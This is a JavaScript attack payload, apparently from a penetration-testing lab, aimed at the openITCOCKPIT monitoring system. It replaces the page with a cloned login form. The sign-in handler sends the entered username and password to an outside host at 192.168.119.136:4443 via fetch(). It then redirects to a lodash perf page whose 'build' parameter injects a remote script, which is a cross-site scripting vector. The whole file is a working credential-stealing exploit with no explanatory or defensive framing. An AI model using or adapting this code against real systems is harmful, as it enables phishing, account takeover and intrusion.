loginPage = 
`<head>
    <!--[if IE]>
    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
    <![endif]-->
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
    <title>
        Login - open source system monitoring    </title>
    <link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"icon\"><link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"shortcut icon\">    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/smartadmin/css/font-awesome.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/login.css?1669072828\">

    <script type=\"text/javascript\" src=\"/frontend/js/lib/jquery.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/lib/particles.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/login.js?1669072828\"></script>


</head>
<body class=\"main\">


    <div class=\"login-screen\">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class=\"container-fluid\">
    <div class=\"row\">
                    <div id=\"particles-js\" class=\"col-xs-12 col-sm-6 col-md-7 col-lg-9\"><canvas class=\"particles-js-canvas-el\" style=\"width: 100%; height: 100%;\" width=\"1410\" height=\"670\"></canvas></div>
            </div>
</div>

<div class=\"login-center\">
    <div class=\"min-height container-fluid\">
        <div class=\"row\">
            <div class=\"col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9\">
                <div class=\"login\" id=\"card\">
                    <div class=\"login-alert\">
                                                                    </div>
                    <div class=\"login-header\">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class=\"login-form-div\">
                        <div class=\"front signin_form\">
                            <p>Login</p>
                            <form action=\"/login/login\" novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
                            
                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-user\"></i>
                                    </span>
                                </div>
                            </div>


                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-lock\"></i>
                                    </span>
                                </div>
                            </div>

                            <div class=\"checkbox\">
                                <div class=\"checkbox\"><input type=\"hidden\" name=\"data[LoginUser][remember_me]\" id=\"LoginUserRememberMe_\" value=\"0\"><label for=\"LoginUserRememberMe\"><input type=\"checkbox\" name=\"data[LoginUser][remember_me]\" class=\"\" value=\"1\" id=\"LoginUserRememberMe\"> Remember me on this computer</label></div>                            </div>

                            <div class=\"form-group sign-btn\">
                                <button type=\"submit\" class=\"btn btn-primary pull-right\">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class=\"footer\">
    <div class=\"container-fluid\">
        <div class=\"row pull-right\">
            <div class=\"col-xs-12\">
                <a href=\"https://openitcockpit.io/\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-globe\"></i>
                </a>
                <a href=\"https://github.com/it-novum/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-github\"></i>
                </a>
                <a href=\"https://twitter.com/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-twitter\"></i>
                </a>
            </div>
        </div>
    </div>
</div>



<div class=\"container\">
    <div class=\"row\">
        <div class=\"col-xs-12\">
                    </div>
    </div>
</div>


</body>`;
document.getElementsByTagName("html")[0].innerHTML = loginPage;
form = document.getElementById("login-form");
form.action = 'https://192.168.119.136:4443/'
login_username = document.getElementById("LoginUserUsername");
login_password = document.getElementById("LoginUserPassword");
submitButton = document.getElementsByClassName("btn btn-primary pull-right")[0];
form.onsubmit = function() {
    alert('okay');
}


submitButton.onclick= function(){
    //alert(login_username.value);
    //alert(login_password.value);
    fetch(`https://192.168.119.136:4443/${login_username.value}:${login_password.value}`, {
        method: 'POST',
        mode: 'no-cors',
        //body:`${login_username.value}:${login_password.value}`
    }).then((response) => response);
    window.location='https://openitcockpit/js/vendor/lodash/perf/index.html?build=https://192.168.119.136:4443/client.js%22%3E'
    //
};

console.log(submitButton)
